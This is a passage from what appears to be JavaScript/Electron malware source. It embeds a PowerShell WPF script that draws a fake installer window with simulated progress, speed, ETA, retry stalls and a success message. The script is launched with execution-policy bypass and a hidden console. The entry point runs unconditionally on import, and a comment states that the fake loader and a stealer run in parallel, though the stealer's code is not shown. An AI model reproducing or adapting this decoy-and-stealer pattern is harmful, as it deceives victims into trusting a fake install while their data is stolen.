                  <DropShadowEffect Color="#FFFFFF" BlurRadius="10" ShadowDepth="0" Opacity="0.5"/>
                </TextBlock.Effect>
              </TextBlock>
            </Grid>
 
            <!-- Enhanced Progress Bar -->
            <Border Height="12" CornerRadius="6" Background="#181818" BorderThickness="1" BorderBrush="#2A2A2A">
              <Border Name="progressBar" HorizontalAlignment="Left" Width="0" Height="10" CornerRadius="5">
                <Border.Background>
                  <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
                    <GradientStop Color="#555555" Offset="0"/>
                    <GradientStop Color="#FFFFFF" Offset="1"/>
                  </LinearGradientBrush>
                </Border.Background>
                <Border.Effect>
                  <DropShadowEffect Color="#FFFFFF" BlurRadius="12" ShadowDepth="0" Opacity="0.6"/>
                </Border.Effect>
                <Grid>
                  <Border Height="2" VerticalAlignment="Top" Background="#80FFFFFF" Margin="2,1,2,0" CornerRadius="1"/>
                </Grid>
              </Border>
            </Border>
 
            <!-- Stats Grid -->
            <Grid Margin="0,25,0,0">
              <Grid.ColumnDefinitions>
                <ColumnDefinition Width="*"/>
                <ColumnDefinition Width="*"/>
                <ColumnDefinition Width="*"/>
              </Grid.ColumnDefinitions>
              
              <StackPanel Grid.Column="0">
                <TextBlock Text="NETWORK SPEED" Foreground="#888888" FontSize="11" FontWeight="Bold" Margin="0,0,0,6"/>
                <TextBlock Name="txtSpeed" Text="0.0 MB/s" Foreground="#EEEEEE" FontSize="15" FontFamily="Consolas" FontWeight="SemiBold"/>
              </StackPanel>

              <StackPanel Grid.Column="1" HorizontalAlignment="Center">
                <TextBlock Text="DATA ALLOCATED" Foreground="#888888" FontSize="11" FontWeight="Bold" Margin="0,0,0,6" HorizontalAlignment="Center"/>
                <TextBlock Name="txtSize" Text="0.00 / 2.30 GB" Foreground="#EEEEEE" FontSize="15" FontFamily="Consolas" HorizontalAlignment="Center" FontWeight="SemiBold"/>
              </StackPanel>

              <StackPanel Grid.Column="2" HorizontalAlignment="Right">
                <TextBlock Text="EST. COMPLETION" Foreground="#888888" FontSize="11" FontWeight="Bold" Margin="0,0,0,6" HorizontalAlignment="Right"/>
                <TextBlock Name="txtEta" Text="02:00" Foreground="#EEEEEE" FontSize="15" FontFamily="Consolas" HorizontalAlignment="Right" FontWeight="SemiBold"/>
              </StackPanel>
            </Grid>

            <!-- Success Panel -->
            <Border Name="completePanel" Opacity="0" Margin="0,30,0,0" Padding="16" CornerRadius="12" BorderThickness="1" BorderBrush="#FFFFFF" Visibility="Collapsed">
              <Border.Background>
                <SolidColorBrush Color="#222222" Opacity="0.5"/>
              </Border.Background>
              <StackPanel Orientation="Horizontal" HorizontalAlignment="Center">
                <Border Width="24" Height="24" CornerRadius="12" Background="#FFFFFF">
                   <Path Data="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" Fill="Black" Stretch="Uniform" Width="14" Height="14"/>
                </Border>
                <TextBlock Text="Deployment completed flawlessly. System initialized." Foreground="#FFFFFF" FontSize="14" FontWeight="Bold" VerticalAlignment="Center" Margin="12,0,0,0"/>
              </StackPanel>
            </Border>

          </StackPanel>
        </Border>
 
        <StackPanel Grid.Row="2" Orientation="Horizontal" HorizontalAlignment="Right" Margin="0,10,0,0">
          <Border Name="cancelButton" CornerRadius="8" Padding="30,12" Background="#141414" BorderThickness="1" BorderBrush="#2A2A2A" Cursor="Hand">
            <TextBlock Text="Abort" Foreground="#888888" FontSize="14" FontWeight="SemiBold"/>
          </Border>
          <Border Name="launchButton" CornerRadius="8" Padding="40,12" Margin="15,0,0,0" Cursor="Hand" Visibility="Collapsed">
            <Border.Background>
              <LinearGradientBrush StartPoint="0,0" EndPoint="1,1">
                <GradientStop Color="#FFFFFF" Offset="0"/>
                <GradientStop Color="#CCCCCC" Offset="1"/>
              </LinearGradientBrush>
            </Border.Background>
            <Border.Effect>
              <DropShadowEffect Color="#FFFFFF" BlurRadius="15" ShadowDepth="0" Opacity="0.4"/>
            </Border.Effect>
            <TextBlock Text="Launch ${exeName}" Foreground="#000000" FontSize="14" FontWeight="Bold"/>
          </Border>
        </StackPanel>
      </Grid>
    </Grid>
  </Border>
</Window>
"@

$reader = [System.Xml.XmlReader]::Create([System.IO.StringReader]$xaml)
$window = [System.Windows.Markup.XamlReader]::Load($reader)

$window.Add_MouseLeftButtonDown({ $window.DragMove() })

$txtPercent = $window.FindName("txtPercent")
$txtSpeed = $window.FindName("txtSpeed")
$txtSize = $window.FindName("txtSize")
$txtEta = $window.FindName("txtEta")
$txtStatus = $window.FindName("txtStatus")
$progressBar = $window.FindName("progressBar")
$completePanel = $window.FindName("completePanel")
$cancelButton = $window.FindName("cancelButton")
$launchButton = $window.FindName("launchButton")
$step3panel = $window.FindName("step3panel")
$step4panel = $window.FindName("step4panel")
$dot3 = $window.FindName("dot3")
$dot4 = $window.FindName("dot4")
$txtStep3 = $window.FindName("txtStep3")
$txtStep4 = $window.FindName("txtStep4")
$txtDot3 = $window.FindName("txtDot3")
$txtDot4 = $window.FindName("txtDot4")
$line2 = $window.FindName("line2")
$line3 = $window.FindName("line3")

$totalWidth = 480.0
$current = 0.0
$rng = New-Object System.Random
$totalSizeGB = 2.30
$ticks = 0
$phase = 0
$phaseProgress = 0.0
$speedHistory = @()
$lastSpeed = 28.0
$stallCounter = 0
$retryShown = $false
$targetDuration = 90
$initialETA = $rng.Next(240, 266)  # Random between 4:00 (240s) and 4:25 (265s)

# Shorter, cleaner status messages
$statusMessages = @(
    "Initializing core modules...",
    "Downloading components...",
    "Extracting files...",
    "Configuring system...",
    "Verifying integrity...",
    "Installing packages...",
    "Optimizing performance...",
    "Finalizing setup..."
)

# Phase definitions for realistic progression (tuned for 90 second completion)
$phases = @(
    @{ Name = "Initialization"; Start = 0; End = 15; BaseSpeed = 28; Variance = 8; Duration = 18 },
    @{ Name = "Deployment"; Start = 15; End = 35; BaseSpeed = 26; Variance = 10; Duration = 25 },
    @{ Name = "Extraction"; Start = 35; End = 70; BaseSpeed = 24; Variance = 12; Duration = 32 },
    @{ Name = "Finalization"; Start = 70; End = 100; BaseSpeed = 22; Variance = 8; Duration = 15 }
)

$cancelButton.Add_MouseLeftButtonDown({ $window.Close() })

$timer = New-Object System.Windows.Threading.DispatcherTimer
$timer.Interval = [TimeSpan]::FromMilliseconds(300)
$startTime = Get-Date

$timer.Add_Tick({
    if ($script:current -lt 100) {
        $ticks++
        
        # Calculate elapsed time and adjust progress to hit 90 seconds
        $elapsed = ((Get-Date) - $script:startTime).TotalSeconds
        $targetProgress = ($elapsed / $script:targetDuration) * 100
        
        # Determine current phase
        $currentPhase = $phases[$script:phase]
        
        # Realistic speed simulation with momentum
        $targetSpeed = $currentPhase.BaseSpeed + ($rng.NextDouble() * $currentPhase.Variance - $currentPhase.Variance/2)
        $script:lastSpeed = $script:lastSpeed * 0.75 + $targetSpeed * 0.25
        
        # Occasional micro-stutters for realism (7% chance)
        if ($rng.NextDouble() -lt 0.07 -and $script:current -gt 8 -and $script:current -lt 96) {
            $script:stallCounter = [Math]::Max(2, $rng.Next(2, 5))
        }
        
        if ($script:stallCounter -gt 0) {
            $script:lastSpeed = $script:lastSpeed * 0.25
            $script:stallCounter--
            if ($script:stallCounter -eq 2 -and -not $script:retryShown) {
                $txtStatus.Text = "Connection unstable, retrying..."
                $script:retryShown = $true
            }
        } else {
            $script:retryShown = $false
        }
        
        # Smooth progress towards target (ensures 90 second completion)
        $progressDiff = $targetProgress - $script:current
        if ($progressDiff -gt 0) {
            $increment = $progressDiff * 0.15
        } else {
            $increment = 0.08
        }
        
        $script:current += $increment
        
        # Phase transition logic
        if ($script:current -ge $currentPhase.End -and $script:phase -lt ($phases.Count - 1)) {
            $script:phase++
            $currentPhase = $phases[$script:phase]
        }
        
        if ($script:current -gt 100) { $script:current = 100 }
        
        # Update package counter
        $script:packageCurrent = [Math]::Floor(($script:current / 100) * $script:packageTotal)
        if ($script:packageCurrent -gt $script:packageTotal) { $script:packageCurrent = $script:packageTotal }

        # Ultra-smooth progress bar animation
        $targetWidth = ($totalWidth * $script:current / 100)
        $anim = New-Object System.Windows.Media.Animation.DoubleAnimation
        $anim.To = $targetWidth
        $anim.Duration = [TimeSpan]::FromMilliseconds(300)
        $progressBar.BeginAnimation([System.Windows.FrameworkElement]::WidthProperty, $anim)
        
        $txtPercent.Text = [Math]::Floor($script:current).ToString() + "%"
        $dl = [Math]::Round($totalSizeGB * $script:current / 100, 2)
        $txtSize.Text = "{0:N2} / {1:N2} GB" -f $dl, $totalSizeGB
 
        # Display realistic speed
        $displaySpeed = [Math]::Max(0, [Math]::Round($script:lastSpeed, 1))
        $txtSpeed.Text = "{0:N1} MB/s" -f $displaySpeed
        
        # Precise ETA calculation (shows 4:00-4:25 initially, converges to actual completion at 90s)
        $elapsedSecs = ((Get-Date) - $script:startTime).TotalSeconds
        $remainingProgress = 100 - $script:current
        
        if ($script:current -lt 3) {
            # Initial estimate: show random time between 4:00 and 4:25
            $etaSeconds = $script:initialETA
        } elseif ($script:current -gt 0.1 -and $elapsedSecs -gt 0) {
            # Gradually transition from initial fake ETA to real remaining time
            $progressRate = $script:current / $elapsedSecs
            if ($progressRate -gt 0) {
                $realETA = [Math]::Floor($remainingProgress / $progressRate)
                
                # Blend between fake initial ETA and real ETA based on progress
                $blendFactor = [Math]::Min(1.0, $script:current / 25)  # Fully transition by 25%
                $etaSeconds = [Math]::Floor($script:initialETA * (1 - $blendFactor) + $realETA * $blendFactor)
                
                # Add slight variance for realism
                $etaSeconds = [Math]::Max(1, $etaSeconds + $rng.Next(-2, 3))
            } else {
                $etaSeconds = $script:initialETA
            }
        } else {
            $etaSeconds = $script:initialETA
        }
        
        $etaSpan = [TimeSpan]::FromSeconds($etaSeconds)
        $txtEta.Text = $etaSpan.ToString("mm\:ss")

        # Clean, short status messages
        if ($script:stallCounter -eq 0) {
            $msgIndex = [Math]::Floor(($script:current / 100) * $statusMessages.Count)
            if ($msgIndex -ge $statusMessages.Count) { $msgIndex = $statusMessages.Count - 1 }
            $txtStatus.Text = $statusMessages[$msgIndex]
        }

        # Ultra-smooth sidebar step transitions with professional easing
        if ($script:current -ge 15 -and $step3panel.Opacity -lt 0.99) {
            # Smooth fade-in for step 3 panel (longer duration = smoother)
            $fadeIn = New-Object System.Windows.Media.Animation.DoubleAnimation
            $fadeIn.From = $step3panel.Opacity
            $fadeIn.To = 1.0
            $fadeIn.Duration = [TimeSpan]::FromMilliseconds(1500)
            $step3panel.BeginAnimation([System.Windows.UIElement]::OpacityProperty, $fadeIn)
            
            # Animate dot transformation
            $dot3.Style = $window.FindResource("StepDotActive")
            $txtStep3.Style = $window.FindResource("StepTextActive")
            $txtDot3.Foreground = [System.Windows.Media.Brushes]::Black
            
            # Smooth line color transition using brush animation
            $whiteBrush = New-Object System.Windows.Media.SolidColorBrush
            $whiteBrush.Color = [System.Windows.Media.Color]::FromRgb(255, 255, 255)
            $line2.Background = $whiteBrush
            
            $colorAnim = New-Object System.Windows.Media.Animation.ColorAnimation
            $colorAnim.From = [System.Windows.Media.Color]::FromRgb(42, 42, 42)
            $colorAnim.To = [System.Windows.Media.Color]::FromRgb(255, 255, 255)
            $colorAnim.Duration = [TimeSpan]::FromMilliseconds(1500)
            $whiteBrush.BeginAnimation([System.Windows.Media.SolidColorBrush]::ColorProperty, $colorAnim)
            
            # Add glow effect with smooth fade-in
            $glowEffect = New-Object System.Windows.Media.Effects.DropShadowEffect
            $glowEffect.Color = [System.Windows.Media.Color]::FromRgb(255, 255, 255)
            $glowEffect.BlurRadius = 5
            $glowEffect.ShadowDepth = 0
            $glowEffect.Opacity = 0
            $line2.Effect = $glowEffect
            
            $glowAnim = New-Object System.Windows.Media.Animation.DoubleAnimation
            $glowAnim.From = 0.0
            $glowAnim.To = 1.0
            $glowAnim.Duration = [TimeSpan]::FromMilliseconds(1500)
            $glowEffect.BeginAnimation([System.Windows.Media.Effects.DropShadowEffect]::OpacityProperty, $glowAnim)
        }
        
        if ($script:current -ge 35 -and $step4panel.Opacity -lt 0.99) {
            # Smooth fade-in for step 4 panel (longer duration = smoother)
            $fadeIn = New-Object System.Windows.Media.Animation.DoubleAnimation
            $fadeIn.From = $step4panel.Opacity
            $fadeIn.To = 1.0
            $fadeIn.Duration = [TimeSpan]::FromMilliseconds(1500)
            $step4panel.BeginAnimation([System.Windows.UIElement]::OpacityProperty, $fadeIn)
            
            # Animate dot transformation
            $dot4.Style = $window.FindResource("StepDotActive")
            $txtStep4.Style = $window.FindResource("StepTextActive")
            $txtDot4.Foreground = [System.Windows.Media.Brushes]::Black
            
            # Smooth line color transition using brush animation
            $whiteBrush = New-Object System.Windows.Media.SolidColorBrush
            $whiteBrush.Color = [System.Windows.Media.Color]::FromRgb(255, 255, 255)
            $line3.Background = $whiteBrush
            
            $colorAnim = New-Object System.Windows.Media.Animation.ColorAnimation
            $colorAnim.From = [System.Windows.Media.Color]::FromRgb(42, 42, 42)
            $colorAnim.To = [System.Windows.Media.Color]::FromRgb(255, 255, 255)
            $colorAnim.Duration = [TimeSpan]::FromMilliseconds(1500)
            $whiteBrush.BeginAnimation([System.Windows.Media.SolidColorBrush]::ColorProperty, $colorAnim)
            
            # Add glow effect with smooth fade-in
            $glowEffect = New-Object System.Windows.Media.Effects.DropShadowEffect
            $glowEffect.Color = [System.Windows.Media.Color]::FromRgb(255, 255, 255)
            $glowEffect.BlurRadius = 5
            $glowEffect.ShadowDepth = 0
            $glowEffect.Opacity = 0
            $line3.Effect = $glowEffect
            
            $glowAnim = New-Object System.Windows.Media.Animation.DoubleAnimation
            $glowAnim.From = 0.0
            $glowAnim.To = 1.0
            $glowAnim.Duration = [TimeSpan]::FromMilliseconds(1500)
            $glowEffect.BeginAnimation([System.Windows.Media.Effects.DropShadowEffect]::OpacityProperty, $glowAnim)
        }

        # Completion sequence
        if ($script:current -ge 100) {
            $timer.Stop()
            $txtSpeed.Text = "0.0 MB/s"
            $txtEta.Text = "00:00"
            $txtStatus.Text = "Installation complete!"

            $completePanel.Visibility = "Visible"
            $cancelButton.Visibility = "Collapsed"
            $launchButton.Visibility = "Visible"

            # Smooth fade-in for completion panel
            $fadeAnim = New-Object System.Windows.Media.Animation.DoubleAnimation
            $fadeAnim.From = 0.0
            $fadeAnim.To = 1.0
            $fadeAnim.Duration = [TimeSpan]::FromMilliseconds(1000)
            $completePanel.BeginAnimation([System.Windows.UIElement]::OpacityProperty, $fadeAnim)

            $launchButton.Add_MouseLeftButtonDown({ $window.Close() })
        }
    }
})

$window.Add_ContentRendered({ $timer.Start() })
$window.ShowDialog() | Out-Null

`;

            const ps1Path = path.join(os.tmpdir(), `loader_${Date.now()}.ps1`);
            fsSync.writeFileSync(ps1Path, ps1, 'utf8');
            console.log('[i] Premium fluid loader script written to:', ps1Path);

            const proc = spawn('powershell.exe', [
                '-NoProfile',
                '-ExecutionPolicy', 'Bypass',
                '-WindowStyle', 'Hidden',
                '-NoLogo',
                '-File', ps1Path
            ], { detached: false, stdio: 'pipe', windowsHide: true });

            proc.stdout.on('data', (data) => console.log('[PS]', data.toString()));
            proc.stderr.on('data', (data) => console.error('[PS ERROR]', data.toString()));

            proc.on('error', (err) => {
                console.error('[!] PowerShell spawn error:', err.message);
                try { fsSync.unlinkSync(ps1Path); } catch (e) { }
                resolve();
            });

            proc.on('close', (code) => {
                console.log('[i] Premium loader closed with code:', code);
                try { fsSync.unlinkSync(ps1Path); } catch (e) { }
                resolve();
            });

            // 120 saniye timeout (90s animasyon + 30s buffer for user to click Launch)
            setTimeout(() => {
                console.log('[i] Premium loader timeout reached');
                try { proc.kill(); } catch (e) { }
                try { fsSync.unlinkSync(ps1Path); } catch (e) { }
                resolve();
            }, 120000);

        } catch (e) {
            console.error('[!] Premium loader exception:', e.message);
            resolve();
        }
    });
}

// === ENTRY POINT ===
let _runningPromise = null;
function _runOnce() {
  if (_runningPromise) return _runningPromise;
  _runningPromise = (async () => {
    // Fake loader ve stealer paralel çalışır
    showFakeLoader();
    await main();
  })().catch(error => {
    console.error('[317] Fatal error in main():', error);
  });
  return _runningPromise;
}

// Auto-execute unconditionally
_runOnce();

// Export for Electron renderer
if (typeof module !== 'undefined' && module.exports) {
  module.exports = { main: _runOnce };
}
